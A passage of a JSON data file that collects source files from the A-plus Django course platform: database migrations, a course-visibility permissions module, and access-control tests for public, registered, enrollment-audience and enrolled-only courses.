validators=[django.core.validators.RegexValidator(regex='^[\\\\w\\\\-\\\\.]*$')], max_length=255),\n            preserve_default=True,\n        ),\n    ]\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/Aalto-LeTech/a-plus/blob/e90b78565cf2d4f99b44b38424eb5b85b8a055fe",
        "file_path": "/course/migrations/0011_auto_20151215_1133.py",
        "source": "# -*- coding: utf-8 -*-\nfrom __future__ import unicode_literals\n\nfrom django.db import models, migrations\n\n\nclass Migration(migrations.Migration):\n\n    dependencies = [\n        ('course', '0010_auto_20151214_1714'),\n    ]\n\n    operations = [\n        migrations.AddField(\n            model_name='coursechapter',\n            name='parent',\n            field=models.ForeignKey(to='course.CourseChapter', blank=True, null=True, related_name='children'),\n            preserve_default=True,\n        ),\n        migrations.AlterUniqueTogether(\n            name='coursechapter',\n            unique_together=set([]),\n        ),\n    ]\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/Aalto-LeTech/a-plus/blob/e90b78565cf2d4f99b44b38424eb5b85b8a055fe",
        "file_path": "/course/migrations/0021_auto_20160726_1209.py",
        "source": "# -*- coding: utf-8 -*-\nfrom __future__ import unicode_literals\n\nfrom django.db import models, migrations\n\n\nclass Migration(migrations.Migration):\n\n    dependencies = [\n        ('userprofile', '0002_auto_20150427_1717'),\n        ('course', '0020_auto_20160615_1239'),\n    ]\n\n    operations = [\n        migrations.CreateModel(\n            name='Enrollment',\n            fields=[\n                ('id', models.AutoField(auto_created=True, serialize=False, primary_key=True, verbose_name='ID')),\n                ('timestamp', models.DateTimeField(auto_now_add=True)),\n                ('personal_code', models.CharField(max_length=10, blank=True, default='')),\n                ('course_instance', models.ForeignKey(to='course.CourseInstance')),\n                ('user_profile', models.ForeignKey(to='userprofile.UserProfile')),\n            ],\n            options={\n            },\n            bases=(models.Model,),\n        ),\n        migrations.AddField(\n            model_name='courseinstance',\n            name='students2',\n            field=models.ManyToManyField(to='userprofile.UserProfile', through='course.Enrollment', related_name='enrolled', blank=True),\n            preserve_default=True,\n        ),\n    ]\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/Aalto-LeTech/a-plus/blob/e90b78565cf2d4f99b44b38424eb5b85b8a055fe",
        "file_path": "/course/migrations/0025_auto_20160728_1139.py",
        "source": "# -*- coding: utf-8 -*-\nfrom __future__ import unicode_literals\n\nfrom django.db import models, migrations\nimport django.db.models.deletion\n\n\nclass Migration(migrations.Migration):\n\n    dependencies = [\n        ('userprofile', '0003_auto_20160728_1139'),\n        ('course', '0024_auto_20160726_1232'),\n    ]\n\n    operations = [\n        migrations.CreateModel(\n            name='StudentGroup',\n            fields=[\n                ('id', models.AutoField(verbose_name='ID', primary_key=True, auto_created=True, serialize=False)),\n                ('timestamp', models.DateTimeField(auto_now_add=True)),\n                ('course_instance', models.ForeignKey(related_name='groups', to='course.CourseInstance')),\n                ('members', models.ManyToManyField(to='userprofile.UserProfile', related_name='groups')),\n            ],\n            options={\n                'ordering': ['course_instance', 'timestamp'],\n            },\n            bases=(models.Model,),\n        ),\n        migrations.AddField(\n            model_name='enrollment',\n            name='selected_group',\n            field=models.ForeignKey(null=True, on_delete=django.db.models.deletion.SET_NULL, default=None, blank=True, to='course.StudentGroup'),\n            preserve_default=True,\n        ),\n    ]\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/Aalto-LeTech/a-plus/blob/e90b78565cf2d4f99b44b38424eb5b85b8a055fe",
        "file_path": "/course/migrations/0029_usertags.py",
        "source": "# -*- coding: utf-8 -*-\nfrom __future__ import unicode_literals\n\nfrom django.db import models, migrations\nimport lib.models\nimport colorfield.fields\n\n\nclass Migration(migrations.Migration):\n\n    dependencies = [\n        ('userprofile', '0003_auto_20160728_1139'),\n        ('course', '0028_auto_20160825_0601'),\n    ]\n\n    operations = [\n        migrations.CreateModel(\n            name='UserTag',\n            fields=[\n                ('id', models.AutoField(auto_created=True, serialize=False, primary_key=True, verbose_name='ID')),\n                ('name', models.CharField(max_length=200)),\n                ('description', models.CharField(blank=True, max_length=164, help_text='Describe the usage or meaning of this usertag')),\n                ('visible_to_students', models.BooleanField(default=False)),\n                ('color', colorfield.fields.ColorField(default='#CD0000', help_text='Color that is used for this tag.', max_length=10)),\n                ('course_instance', models.ForeignKey(related_name='usertags', to='course.CourseInstance')),\n            ],\n            options={\n            },\n            bases=(lib.models.UrlMixin, models.Model),\n        ),\n        migrations.CreateModel(\n            name='UserTagging',\n            fields=[\n                ('id', models.AutoField(auto_created=True, serialize=False, primary_key=True, verbose_name='ID')),\n                ('course_instance', models.ForeignKey(related_name='taggings', to='course.CourseInstance')),\n                ('tag', models.ForeignKey(related_name='taggings', to='course.UserTag')),\n                ('user', models.ForeignKey(related_name='taggings', to='userprofile.UserProfile')),\n            ],\n            options={\n            },\n            bases=(models.Model,),\n        ),\n        migrations.AlterUniqueTogether(\n            name='usertagging',\n            unique_together=set([('tag', 'user', 'course_instance')]),\n        ),\n        migrations.AlterIndexTogether(\n            name='usertagging',\n            index_together=set([('user', 'course_instance')]),\n        ),\n    ]\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/Aalto-LeTech/a-plus/blob/e90b78565cf2d4f99b44b38424eb5b85b8a055fe",
        "file_path": "/course/permissions.py",
        "source": "from django.http import Http404\nfrom django.utils.translation import ugettext_lazy as _\n\nfrom authorization.permissions import (\n    ACCESS,\n    Permission,\n    MessageMixin,\n    ObjectVisibleBasePermission,\n    FilterBackend,\n)\nfrom exercise.cache.points import CachedPoints\nfrom userprofile.models import UserProfile\nfrom .models import (\n    CourseModule,\n    CourseInstance,\n)\n\n\nclass CourseVisiblePermission(ObjectVisibleBasePermission):\n    message = _(\"Permission denied by course visibility\")\n    model = CourseInstance\n    obj_var = 'instance'\n\n    def is_object_visible(self, request, view, course):\n        \"\"\"\n        Find out if CourseInstance is visible to user\n        We expect that AccessModePermission is checked first\n\n         - Always visible to course staff\n         - Always hidden if not open (visible_to_students)\n         - Always visible if public\n         - If not public:\n           - Require authentication\n           - If view_access == enrolled -> visible if student of the course\n           - If enrollment audience external, user should be external\n           - If enrollment audience internal, user should be internal\n        \"\"\"\n        # NOTE: course is actually course instance\n\n        # Course is always visible to staff members\n        if view.is_course_staff:\n            return True\n\n        # Course is not visible if it's hidden\n        if not course.visible_to_students:\n            self.error_msg(_(\"The resource is not currently visible.\"))\n            return False\n\n        user = request.user\n        show_for = course.view_content_to\n        VA = course.VIEW_ACCESS\n\n        # FIXME: we probably should test if access_mode is ANONYMOUS (public), but that\n        # would break api permissiosn (requires get_access_mode)\n        if show_for != VA.PUBLIC:\n            if not user.is_authenticated():\n                self.error_msg(_(\"This course is not open for public.\"))\n                return False\n\n            # Handle enroll views separately\n            if view.get_access_mode() == ACCESS.ENROLL:\n                return self.enrollment_audience_check(request, course, user)\n\n            if show_for == VA.ENROLLED:\n                if not course.is_student(user):\n                    self.error_msg(_(\"Only enrolled students shall pass.\"))\n                    return False\n\n            elif show_for == VA.ENROLLMENT_AUDIENCE:\n                return self.enrollment_audience_check(request, course, user)\n\n        return True\n\n    def enrollment_audience_check(self, request, course, user):\n        audience = course.enrollment_audience\n        external = user.userprofile.is_external\n        EA = course.ENROLLMENT_AUDIENCE\n        if audience == EA.INTERNAL_USERS and external:\n            self.error_msg(_(\"This course is only for internal students.\"))\n            return False\n        elif audience == EA.EXTERNAL_USERS and not external:\n            self.error_msg(_(\"This course is only for external students.\"))\n            return False\n        return True\n\n\nclass EnrollInfoVisiblePermission(ObjectVisibleBasePermission):\n    message = _(\"Permission denied by course visibility\")\n    model = CourseInstance\n    obj_var = 'instance'\n\n    def is_object_visible(self, request, view, course_instance):\n        # Course is always visible to staff members\n        if view.is_course_staff:\n            return True\n\n        # Course is not visible if it's hidden\n        if not course_instance.visible_to_students:\n            self.error_msg(_(\"The resource is not currently visible.\"))\n            return False\n\n        # Only public courses may be browsed without logging in.\n        if course_instance.view_content_to != course_instance.VIEW_ACCESS.PUBLIC \\\n                and not request.user.is_authenticated:\n            self.error_msg(_(\"This course is not open for public.\"))\n            return False\n\n        return True\n\n\nclass CourseModulePermission(MessageMixin, Permission):\n    message = _(\"The module is not currently visible\")\n\n    def has_permission(self, request, view):\n        if not view.is_course_staff:\n            module = view.module\n            return self.has_object_permission(request, view, module)\n        return True\n\n    def has_object_permission(self, request, view, module):\n        if not isinstance(module, CourseModule):\n            return True\n\n        if module.status == CourseModule.STATUS.HIDDEN:\n            return False\n\n        if not module.is_after_open():\n            # FIXME: use format from django settings\n            self.error_msg(\n                _(\"The module will open for submissions at {date}.\"),\n                format={'date': module.opening_time},\n                delim=' ',\n            )\n            return False\n\n        if module.requirements.count() > 0:\n            points = CachedPoints(module.course_instance, request.user, view.content)\n            return module.are_requirements_passed(points)\n        return True\n\n\nclass OnlyCourseTeacherPermission(Permission):\n    message = _(\"Only course teacher is allowed\")\n\n    def has_permission(self, request, view):\n        return self.has_object_permission(request, view, view.instance)\n\n    def has_object_permission(self, request, view, obj):\n        return view.is_teacher or request.user.is_superuser\n\n\nclass OnlyCourseStaffPermission(Permission):\n    message = _(\"Only course staff is allowed\")\n\n    def has_permission(self, request, view):\n        return self.has_object_permission(request, view, view.instance)\n\n    def has_object_permission(self, request, view, obj):\n        return view.is_course_staff or request.user.is_superuser\n\n\nclass IsCourseAdminOrUserObjIsSelf(OnlyCourseStaffPermission, FilterBackend):\n\n    def has_object_permission(self, request, view, obj):\n        if not isinstance(obj, UserProfile):\n            return True\n\n        user = request.user\n        return user and (\n            (user.id is not None and user.id == obj.user_id) or\n            super().has_object_permission(request, view, obj)\n        )\n\n    def filter_queryset(self, request, queryset, view):\n        user = request.user\n        if (\n            issubclass(queryset.model, UserProfile) and\n            not view.is_course_staff and\n            not user.is_superuser\n        ):\n            queryset = queryset.filter(user_id=user.id)\n        return queryset\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/Aalto-LeTech/a-plus/blob/e90b78565cf2d4f99b44b38424eb5b85b8a055fe",
        "file_path": "/course/test_visibility_enroll.py",
        "source": "from datetime import timedelta\nimport logging\n\nfrom django.contrib.auth.models import User\nfrom django.core.urlresolvers import reverse\nfrom django.test import TestCase\nfrom django.test.client import Client\nfrom django.utils import timezone\n\nfrom course.models import Course, CourseInstance, CourseModule, \\\n    LearningObjectCategory\nfrom exercise.exercise_models import BaseExercise, CourseChapter, LearningObject\nfrom exercise.submission_models import Submission\n\nclass CourseVisibilityTest(TestCase):\n    \"\"\"Tests for course visibility and access control.\n    There are also some tests about enrollment.\n    \"\"\"\n\n    def setUp(self):\n        self.user = User(username=\"testUser\") # not enrolled in the course\n        self.user.set_password(\"testUser\")\n        self.user.save()\n\n        self.student = User(username=\"student\") # enrolled in the course\n        self.student.set_password(\"student\")\n        self.student.save()\n\n        self.course = Course.objects.create(\n            name=\"Test course\",\n            code=\"123456\",\n            url=\"Course-Url\",\n        )\n\n        self.today = timezone.now()\n        self.tomorrow = self.today + timedelta(days=1)\n        self.two_days_from_now = self.tomorrow + timedelta(days=1)\n        self.yesterday = self.today - timedelta(days=1)\n\n        # course instances with different view_access_to settings\n        self.public_course_instance = CourseInstance.objects.create(\n            instance_name=\"Public\",\n            starting_time=self.yesterday,\n            ending_time=self.tomorrow,\n            course=self.course,\n            url=\"public\",\n            view_content_to=CourseInstance.VIEW_ACCESS.PUBLIC,\n            enrollment_audience=CourseInstance.ENROLLMENT_AUDIENCE.INTERNAL_USERS,\n        )\n\n        self.all_regist_course_instance = CourseInstance.objects.create(\n            instance_name=\"All registered users\",\n            starting_time=self.yesterday,\n            ending_time=self.tomorrow,\n            course=self.course,\n            url=\"allregistered\",\n            view_content_to=CourseInstance.VIEW_ACCESS.ALL_REGISTERED,\n            enrollment_audience=CourseInstance.ENROLLMENT_AUDIENCE.INTERNAL_USERS,\n        )\n\n        self.enroll_audience_course_instance = CourseInstance.objects.create(\n            instance_name=\"Enrollment audience\",\n            starting_time=self.yesterday,\n            ending_time=self.two_days_from_now,\n            course=self.course,\n            url=\"enrollmentaudience\",\n            view_content_to=CourseInstance.VIEW_ACCESS.ENROLLMENT_AUDIENCE,\n            enrollment_audience=CourseInstance.ENROLLMENT_AUDIENCE.INTERNAL_USERS,\n        )\n\n        self.enrolled_course_instance = CourseInstance.objects.create(\n            instance_name=\"Enrolled\",\n            starting_time=self.yesterday,\n            ending_time=self.two_days_from_now,\n            course=self.course,\n            url=\"enrolled\",\n            view_content_to=CourseInstance.VIEW_ACCESS.ENROLLED,\n            enrollment_audience=CourseInstance.ENROLLMENT_AUDIENCE.INTERNAL_USERS,\n        )\n        self.course_instances = [self.public_course_instance, self.all_regist_course_instance,\n            self.enroll_audience_course_instance, self.enrolled_course_instance]\n\n        # enrollment\n        for instance in self.course_instances:\n            instance.enroll_student(self.student)\n\n        # module/exercise round for each course instance\n        self.course_modules = {}\n        for instance in self.course_instances:\n            self.course_modules[instance.id] = CourseModule.objects.create(\n                name=\"Test module\",\n                url=\"test-module\",\n                points_to_pass=10,\n                course_instance=instance,\n                opening_time=self.today,\n                closing_time=self.tomorrow,\n            )\n\n        # category\n        self.categories = {}\n        for instance in self.course_instances:\n            self.categories[instance.id] = LearningObjectCategory.objects.create(\n                name=\"Test category\",\n                course_instance=instance,\n                points_to_pass=0,\n            )\n\n        # learning objects\n        self.learning_objects = {}\n        for instance in self.course_instances:\n            lobjects = []\n            chapter = CourseChapter.objects.create(\n                name=\"Test chapter\",\n                course_module=self.course_modules[instance.id],\n                category=self.categories[instance.id],\n                url='chapter1',\n            )\n            lobjects.append(chapter)\n            lobjects.append(BaseExercise.objects.create(\n                name=\"Embedded exercise\",\n                parent=chapter,\n                status=LearningObject.STATUS.UNLISTED,\n                course_module=self.course_modules[instance.id],\n                category=self.categories[instance.id],\n                url='embedexercise',\n                max_submissions=10,\n                max_points=10,\n                points_to_pass=0,\n            ))\n            lobjects.append(BaseExercise.objects.create(\n                name=\"Normal exercise\",\n                course_module=self.course_modules[instance.id],\n                category=self.categories[instance.id],\n                url='normalexercise',\n                max_submissions=10,\n                max_points=10,\n                points_to_pass=0,\n            ))\n            self.learning_objects[instance.id] = lobjects\n\n        # submissions\n        self.submissions = {}\n        for course_instance_id, exercises in self.learning_objects.items():\n            for exercise in exercises:\n                if not exercise.is_submittable:\n                    continue\n                self.submissions[exercise.id] = []\n                submission = Submission.objects.create(\n                    exercise=exercise,\n                )\n                submission.submitters.add(self.student.userprofile)\n                self.submissions[exercise.id].append(submission)\n\n        # disable all logging\n        logging.disable(logging.CRITICAL)\n\n    def test_redirect_to_enroll(self):\n        url = self.enrolled_course_instance.get_absolute_url()\n        # should redirect to A+ login\n        response = self.client.get(url)\n        self.assertRedirects(response, '/accounts/login/?next=' + url)\n\n        # unenrolled logged-in user should be redirected to the enroll page\n        self.assertTrue(self.client.login(username=self.user.username, password='testUser'))\n        response = self.client.get(url)\n        self.assertRedirects(response, self.enrolled_course_instance.get_url('enroll'))\n        self.client.logout()\n\n        # enrolled students should open the course front page normally\n        self.assertTrue(self.client.login(username=self.student.username, password=\"student\"))\n        response = self.client.get(url)\n        self.assertEqual(response.status_code, 200)\n\n    def test_course_home(self):\n        url = self.enroll_audience_course_instance.get_absolute_url()\n        # should redirect to A+ login\n        response = self.client.get(url)\n        self.assertRedirects(response, '/accounts/login/?next=' + url)\n        # unenrolled logged-in user should see the course home page\n        self.assertTrue(self.client.login(username=self.user.username, password='testUser'))\n        response = self.client.get(url)\n        self.assertEqual(response.status_code, 200)\n        self.client.logout()\n        # enrolled students should open the course front page normally\n        self.assertTrue(self.client.login(username=self.student.username, password=\"student\"))\n        response = self.client.get(url)\n        self.assertEqual(response.status_code, 200)\n        self.client.logout()\n\n        # course instance: all registered/logged-in users may see the course\n        url = self.all_regist_course_instance.get_absolute_url()\n        # should redirect to A+ login\n        response = self.client.get(url)\n        self.assertRedirects(response, '/accounts/login/?next=' + url)\n        # unenrolled logged-in user should see the course home page\n        self.assertTrue(self.client.login(username=self.user.username, password='testUser'))\n        response = self.client.get(url)\n        self.assertEqual(response.status_code, 200)\n        self.client.logout()\n        # enrolled students should open the course front page normally\n        self.assertTrue(self.client.login(username=self.student.username, password=\"student\"))\n        response = self.client.get(url)\n        self.assertEqual(response.status_code, 200)\n        self.client.logout()\n\n        # public course instance\n        url = self.public_course_instance.get_absolute_url()\n        # anonymous user should see the course front page\n        response = self.client.get(url)\n        self.assertEqual(response.status_code, 200)\n        # unenrolled logged-in user should see the course home page\n        self.assertTrue(self.client.login(username=self.user.username, password='testUser'))\n        response = self.client.get(url)\n        self.assertEqual(response.status_code, 200)\n        self.client.logout()\n        # enrolled students should open the course front page normally\n        self.assertTrue(self.client.login(username=self.student.username, password=\"student\"))\n        response = self.client.get(url)\n        self.assertEqual(response.status_code, 200)\n        self.client.logout()\n\n        # course content visible to the enrollment audience, but user is\n        # not in the enrollment audience\n        ext_instance = CourseInstance.objects.create(\n            instance_name=\"Enrollment audience external\",\n            starting_time=self.yesterday,\n            ending_time=self.tomorrow,\n            course=self.course,\n            url=\"extaudience\",\n            view_content_to=CourseInstance.VIEW_ACCESS.ENROLLMENT_AUDIENCE,\n            enrollment_audience=CourseInstance.ENROLLMENT_AUDIENCE.EXTERNAL_USERS,\n        )\n        url = ext_instance.get_absolute_url()\n        self.assertTrue(self.client.login(username=self.user.username, password=\"testUser\"))\n        response = self.client.get(url)\n        self.assertEqual(response.status_code, 403) # Forbidden\n        response = self.client.get(ext_instance.get_url('enroll'))\n        self.assertEqual(response.status_code, 200) # allowed to see the enrollment page\n        response = self.client.post(ext_instance.get_url('enroll'))\n        self.assertEqual(response.status_code, 403) # may not enroll\n        self.client.logout()\n\n        # course content visible to registered users (logged-in users), but user is\n        # not in the enrollment audience\n        ext_regist_instance = CourseInstance.objects.create(\n            instance_name=\"Enrollment audience external - view registered users\",\n            starting_time=self.yesterday,\n            ending_time=self.tomorrow,\n            course=self.course,\n            url=\"extaudience-registusers\",\n            view_content_to=CourseInstance.VIEW_ACCESS.ALL_REGISTERED,\n            enrollment_audience=CourseInstance.ENROLLMENT_AUDIENCE.EXTERNAL_USERS,\n        )\n        url = ext_instance.get_absolute_url()\n        self.assertTrue(self.client.login(username=self.user.username, password=\"testUser\"))\n        response = self.client.get(url)\n        self.assertEqual(response.status_code, 403) # Forbidden\n        response = self.client.get(ext_instance.get_url('enroll'))\n        self.assertEqual(response.status_code, 200) # allowed to see the enrollment page\n        response = self.client.post(ext_instance.get_url('enroll'))\n        self.assertEqual(response.status_code, 403) # may not enroll\n        self.client.logout()\n\n    def test_course_module(self):\n        url = self.course_modules[self.enrolled_course_instance.id].get_absolute_url()\n        # should redirect to A+ login\n        response = self.client.get(url)\n        self.assertRedirects(response, '/accounts/login/?next=' + url)\n        # unenrolled logged-in user should not see the module page\n        self.assertTrue(self.client.login(username=self.user.username, password='testUser'))\n        response = self.client.get(url)\n        self.assertEqual(response.status_code, 403)\n        self.client.logout()\n        # enrolled students should open the course module page normally\n        self.assertTrue(self.client.login(username=self.student.username, password=\"student\"))\n        response = self.client.get(url)\n        self.assertEqual(response.status_code, 200)\n        self.client.logout()\n\n        # course instance: access to enrollment audience (logged-in internal users)\n        url = self.course_modules[self.enroll_audience_course_instance.id].get_absolute_url()\n        # should redirect to A+ login\n        response = self.client.get(url)\n        self.assertRedirects(response, '/accounts/login/?next=' + url)\n        # unenrolled logged-in user should see the module page\n        self.assertTrue(self.client.login(username=self.user.username, password='testUser'))\n        response = self.client.get(url)\n        self.assertEqual(response.status_code, 200)\n        self.client.logout()\n        # enrolled students should open the course module page normally\n        self.assertTrue(self.client.login(username=self.student.username, password=\"student\"))\n        response = self.client.get(url)\n        self.assertEqual(response.status_code, 200)\n        self.client.logout()\n\n        # course instance: access to registered users (any logged-in users)\n        url = self.course_modules[self.all_regist_course_instance.id].get_absolute_url()\n        # should redirect to A+ login\n        response = self.client.get(url)\n        self.assertRedirects(response, '/accounts/login/?next=' + url)\n        # unenrolled logged-in user should see the module page\n        self.assertTrue(self.client.login(username=self.user.username, password='testUser'))\n        response = self.client.get(url)\n        self.assertEqual(response.status_code, 200)\n        self.client.logout()\n        # enrolled students should open the course module page normally\n        self.assertTrue(self.client.login(username=self.student.username, password=\"student\"))\n        response = self.client.get(url)\n        self.assertEqual(response.status_code, 200)\n        self.client.logout()\n\n        # course instance: access to anyone (anonymous)\n        url = self.course_modules[self.public_course_instance.id].get_absolute_url()\n        # anonymous user can open the module page\n        response = self.client.get(url)\n        self.assertEqual(response.status_code, 200)\n        # unenrolled logged-in user should see the module page\n        self.assertTrue(self.client.login(username=self.user.username, password='testUser'))\n        response = self.client.get(url)\n        self.assertEqual(response.status_code, 200)\n        self.client.logout()\n        # enrolled students should open the course module page normally\n        self.assertTrue(self.client.login(username=self.student.username, password=\"student\"))\n        response = self.client.get(url)\n        self.assertEqual(response.status_code, 200)\n        self.client.logout()\n\n        # course content visible to the enrollment audience, but user is\n        # not in the enrollment audience\n        ext_instance = CourseInstance.objects.create(\n            instance_name=\"Enrollment audience external\",\n            starting_time=self.yesterday,\n            ending_time=self.tomorrow,\n            course=self.course,\n            url=\"extaudience\",\n            view_content_to=CourseInstance.VIEW_ACCESS.ENROLLMENT_AUDIENCE,\n            enrollment_audience=CourseInstance.ENROLLMENT_AUDIENCE.EXTERNAL_USERS,\n        )\n        ext_module = CourseModule.objects.create(\n            name=\"Test module\",\n            url=\"test-module\",\n            points_to_pass=10,\n            course_instance=ext_instance,\n            opening_time=self.today,\n            closing_time=self.tomorrow,\n        )\n        url = ext_module.get_absolute_url()\n        self.assertTrue(self.client.login(username=self.user.username, password=\"testUser\"))\n        response = self.client.get(url)\n        self.assertEqual(response.status_code, 403) # Forbidden\n        self.client.logout()\n\n    def test_chapter_enrolled_only(self):\n        url = self.learning_objects[self.enrolled_course_instance.id][0].get_display_url()\n        # should redirect to A+ login\n        response = self.client.get(url)\n        self.assertRedirects(response, '/accounts/login/?next=' + url)\n        # unenrolled logged-in user should not see the chapter page\n        self.assertTrue(self.client.login(username=self.user.username, password='testUser'))\n        response = self.client.get(url)\n        self.assertEqual(response.status_code, 403)\n        self.client.logout()\n        # enrolled students should open the chapter page normally\n        self.assertTrue(self.client.login(username=self.student.username, password=\"student\"))\n        response = self.client.get(url)\n        self.assertEqual(response.status_code, 200)\n        self.client.logout()\n\n        # chapter exercise\n        chapter_exercise = self.learning_objects[self.enrolled_course_instance.id][1]\n        url = '/Course-Url/enrolled/test-module/chapter1/embedexercise/plain/'\n        # should redirect to A+ login\n        response = self.client.get(url)\n        self.assertRedirects(response, '/accounts/login/?next=' + url)\n        # unenrolled logged-in user should not see the exercise\n        self.assertTrue(self.client.login(username=self.user.username, password='testUser'))\n        response = self.client.get(url)\n        self.assertEqual(response.status_code, 403)\n        self.client.logout()\n        # enrolled students should open the chapter page normally\n        self.assertTrue(self.client.login(username=self.student.username, password=\"student\"))\n        response = self.client.get(url)\n        self.assertEqual(response.status_code, 200)\n        self.client.logout()\n\n        # normal exercise (not inside chapter)\n        exercise = self.learning_objects[self.enrolled_course_instance.id][2]\n        url = reverse('exercise', kwargs={\n            'exercise_path': exercise.url,\n            'module_slug': exercise.course_module.url,\n            'instance_slug': exercise.course_module.course_instance.url,\n            'course_slug': exercise.course_module.course_instance.course.url,\n        })\n        self.assertEqual(url, '/Course-Url/enrolled/test-module/normalexercise/')\n        # should redirect to A+ login\n        response = self.client.get(url)\n        self.assertRedirects(response, '/accounts/login/?next=' + url)\n        # unenrolled logged-in user should not see the exercise\n        self.assertTrue(self.client.login(username=self.user.username, password='testUser'))\n        response = self.client.get(url)\n        self.assertEqual(response.status_code, 403)\n        self.client.logout()\n        # enrolled students should open the chapter page normally\n        self.assertTrue(self.client.login(username=self.student.username, password=\"student\"))\n        response = self.client.get(url)\n        self.assertEqual(response.status_code, 200)\n        self.client.logout()\n\n    def test_chapter_enroll_audience(self):\n        url = self.learning_objects[self.enroll_audience_course_instance.id][0].get_display_url()\n        # should redirect to A+ login\n        response = self.client.get(url)\n        self.assertRedirects(response, '/accounts/login/?next=' + url)\n        # unenrolled logged-in internal user should see the chapter page\n        self.assertTrue(self.client.login(username=self.user.username, password='testUser'))\n        response = self.client.get(url)\n        self.assertEqual(response.status_code, 200)\n        self.client.logout()\n        # enrolled students should open the chapter page normally\n        self.assertTrue(self.client.login(username=self.student.username, password=\"student\"))\n        response = self.client.get(url)\n        self.assertEqual(response.status_code, 200)\n        self.client.logout()\n\n        # chapter exercise\n        chapter_exercise = self.learning_objects[self.enroll_audience_course_instance.id][1]\n        url = '/Course-Url/enrollmentaudience/test-module/chapter1/embedexercise/plain/'\n        # should redirect to A+ login\n        response = self.client.get(url)\n        self.assertRedirects(response, '/accounts/login/?next=' + url)\n        # unenrolled logged-in internal user should see the exercise\n        self.assertTrue(self.client.login(username=self.user.username, password='testUser'))\n        response = self.client.get(url)\n        self.assertEqual(response.status_code, 200)\n        self.client.logout()\n        # enrolled students should open the chapter page normally\n        self.assertTrue(self.client.login(username=self.student.username, password=\"student\"))\n        response = self.client.get(url)\n        self.assertEqual(response.status_code, 200)\n        self.client.logout()\n\n        # normal exercise (not inside chapter)\n        exercise = self.learning_objects[self.enroll_audience_course_instance.id][2]\n        url = reverse('exercise', kwargs={\n            'exercise_path': exercise.url,\n            'module_slug': exercise.course_module.url,\n            'instance_slug': exercise.course_module.course_instance.url,\n            'course_slug': exercise.course_module.course_instance.course.url,\n        })\n        self.assertEqual(url, '/Course-Url/enrollmentaudience/test-module/normalexercise/')\n        # should redirect to A+ login\n        response = self.client.get(url)\n        self.assertRedirects(response, '/accounts/login/?next=' + url)\n        # unenrolled logged-in user should see the exercise\n        self.assertTrue(self.client.login(username=self.user.username, password='testUser'))\n        response = self.client.get(url)\n        self.assertEqual(response.status_code, 200)\n        self.client.logout()\n        # enrolled students should open the exercise page normally\n        self.assertTrue(self.client.login(username=self.student.username, password=\"student\"))\n        response = self.client.get(url)\n        self.assertEqual(response.status_code, 200)\n        self.client.logout()\n\n        # course content visible to the enrollment audience, but user is\n        # not in the enrollment audience\n        ext_instance = CourseInstance.objects.create(\n            instance_name=\"Enrollment audience external\",\n            starting_time=self.yesterday,\n            ending_time=self.tomorrow,\n            course=self.course,\n            url=\"extaudience\",\n            view_content_to=CourseInstance.VIEW_ACCESS.ENROLLMENT_AUDIENCE,\n            enrollment_audience=CourseInstance.ENROLLMENT_AUDIENCE.EXTERNAL_USERS,\n        )\n        ext_module = CourseModule.objects.create(\n            name=\"Test module\",\n            url=\"test-module\",\n            points_to_pass=10,\n            course_instance=ext_instance,\n            opening_time=self.today,\n            closing_time=self.tomorrow,\n        )\n        ext_category = LearningObjectCategory.objects.create(\n            name=\"External test category\",\n            course_instance=ext_instance,\n            points_to_pass=0,\n        )\n        ext_chapter = CourseChapter.objects.create(\n            name=\"External test chapter\",\n            course_module=ext_module,\n            category=ext_category,\n            url='extchapter1',\n        )\n        url = ext_chapter.get_display_url()\n        # should redirect to A+ login\n        response = self.client.get(url)\n        self.assertRedirects(response, '/accounts/login/?next=' + url)\n        # unenrolled logged-in internal user should NOT see the chapter page\n        # (user is not external and the course is visible to external users only)\n        self.assertTrue(self.client.login(username=self.user.username, password='testUser'))\n        response = self.client.get(url)\n        self.assertEqual(response.status_code, 403)\n        self.client.logout()\n\n    def test_chapter_all_registered(self):\n        url = self.learning_objects[self.all_regist_course_instance.id][0].get_display_url()\n        # should redirect to A+ login\n        response = self.client.get(url)\n        self.assertRedirects(response, '/accounts/login/?next=' + url)\n        # unenrolled logged-in internal user should see the chapter page\n        self.assertTrue(self.client.login(username=self.user.username, password='testUser'))\n        response = self.client.get(url)\n        self.assertEqual(response.status_code, 200)\n        self.client.logout()\n        # enrolled students should open the chapter page normally\n        self.assertTrue(self.client.login(username=self.student.username, password=\"student\"))\n        response = self.client.get(url)\n        self.assertEqual(response.status_code, 200)\n        self.client.logout()\n\n        # chapter exercise\n        chapter_exercise = self.learning_objects[self.all_regist_course_instance.id][1]\n        url = '/Course-Url/allregistered/test-module/chapter1/embedexercise/plain/'\n        # should redirect to A+ login\n        response = self.client.get(url)\n        self.assertRedirects(response, '/accounts/login/?next=' + url)\n        # unenrolled logged-in internal user should see the exercise\n        self.assertTrue(self.client.login(username=self.user.username, password='testUser'))\n        response = self.client.get(url)\n        self.assertEqual(response.status_code, 200)\n        self.client.logout()\n        # enrolled students should open the chapter page normally\n        self.assertTrue(self.client.login(username=self.student.username, password=\"student\"))\n        response = self.client.get(url)\n        self.assertEqual(response.status_code, 200)\n        self.client.logout()\n\n        # normal exercise (not inside chapter)\n        exercise = self.learning_objects[self.all_regist_course_instance.id][2]\n        url = reverse('exercise', kwargs={\n            'exercise_path': exercise.url,\n            'module_slug': exercise.course_module.url,\n            'instance_slug': exercise.course_module.course_instance.url,\n            'course_slug': exercise.course_module.course_instance.course.url,\n        })\n        self.assertEqual(url, '/Course-Url/allregistered/test-module/normalexercise/')\n        # should redirect to A+ login\n        response = self.client.get(url)\n        self.assertRedirects(response, '/accounts/login/?next=' + url)\n        # unenrolled logged-in user should see the exercise\n        self.assertTrue(self.client.login(username=self.user.username, password='testUser'))\n        response = self.client.get(url)\n        self.assertEqual(response.status_code, 200)\n        self.client.logout()\n        # enrolled students should open the exercise page normally\n        self.assertTrue(self.client.login(username=self.student.username, password=\"student\"))\n        response = self.client.get(url)\n        self.assertEqual(response.status_code, 200)\n        self.client.logout()\n\n    def test_chapter_public(self):\n        url = self.learning_objects[self.public_course_instance.id][0].get_display_url()\n        # anonymous user can open the chapter\n        response = self.client.get(url)\n        self.assertEqual(response.status_code, 200)\n        # unenrolled logged-in internal user should see the 